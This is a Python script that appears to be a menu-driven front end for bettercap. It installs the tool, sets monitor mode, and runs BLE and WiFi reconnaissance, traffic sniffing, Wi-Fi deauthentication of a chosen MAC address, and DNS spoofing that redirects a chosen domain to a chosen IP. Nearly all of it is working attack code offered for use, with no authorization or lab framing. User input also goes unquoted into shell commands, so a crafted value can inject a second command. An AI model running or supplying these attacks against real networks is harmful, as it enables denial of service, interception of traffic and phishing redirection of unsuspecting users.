import subprocess
import sys

selected_interface = None

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(stdout.decode())
    if stderr:
        print("Error:", stderr.decode())

def set_monitor_mode(interface):
    print(f"Setting interface {interface} to monitor mode...")
    run_command(f'sudo ip link set {interface} down')
    run_command(f'sudo iw dev {interface} set type monitor')
    run_command(f'sudo ip link set {interface} up')
    print(f"Interface {interface} is now in monitor mode.")

def bettercap_recon(interface):
    print("Starting BLE reconnaissance...")
    run_command(f'sudo bettercap -iface {interface} -caplet ble.recon')

def bettercap_sniff(interface):
    print("Starting network sniffing...")
    run_command(f'sudo bettercap -iface {interface}')

def bettercap_wifi(interface):
    print("Starting WiFi scanning...")
    run_command(f'sudo bettercap -iface {interface} -caplet wifi.recon')

def bettercap_deauth(interface, target):
    print(f"Deauthenticating target {target}...")
    run_command(f'sudo bettercap -iface {interface} -eval "deauth {target}"')

def bettercap_dns_spoof(interface, domain, ip):
    print(f"Starting DNS spoofing for {domain} to redirect to {ip}...")
    run_command(f'sudo bettercap -iface {interface} -eval "set dns.spoof.domains {domain}; set dns.spoof.address {ip}; dns.spoof on"')

def install_bettercap():
    print("Installing bettercap...")
    run_command('sudo apt-get update')
    run_command('sudo apt-get install bettercap')

def select_interface():
    global selected_interface
    selected_interface = input("Enter the interface to use: ")
    print(f"Selected interface: {selected_interface}")

def menu():
    global selected_interface
    while True:
        print("\nBettercap Tools Menu")
        print("1. Install bettercap")
        print("2. Set interface to monitor mode")
        print("3. Select interface")
        print("4. BLE reconnaissance")
        print("5. Network sniffing")
        print("6. WiFi scanning")
        print("7. Deauth target")
        print("8. DNS spoofing")
        print("9. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            install_bettercap()
        elif choice == '2':
            interface = input("Enter the interface to set to monitor mode: ")
            set_monitor_mode(interface)
        elif choice == '3':
            select_interface()
        elif choice == '4':
            if selected_interface:
                bettercap_recon(selected_interface)
            else:
                print("No interface selected. Please select an interface first.")
        elif choice == '5':
            if selected_interface:
                bettercap_sniff(selected_interface)
            else:
                print("No interface selected. Please select an interface first.")
        elif choice == '6':
            if selected_interface:
                bettercap_wifi(selected_interface)
            else:
                print("No interface selected. Please select an interface first.")
        elif choice == '7':
            if selected_interface:
                target = input("Enter target MAC address: ")
                bettercap_deauth(selected_interface, target)
            else:
                print("No interface selected. Please select an interface first.")
        elif choice == '8':
            if selected_interface:
                domain = input("Enter the domain to spoof: ")
                ip = input("Enter the IP address to redirect to: ")
                bettercap_dns_spoof(selected_interface, domain, ip)
            else:
                print("No interface selected. Please select an interface first.")
        elif choice == '9':
            print("Exiting...")
            sys.exit()
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    menu()
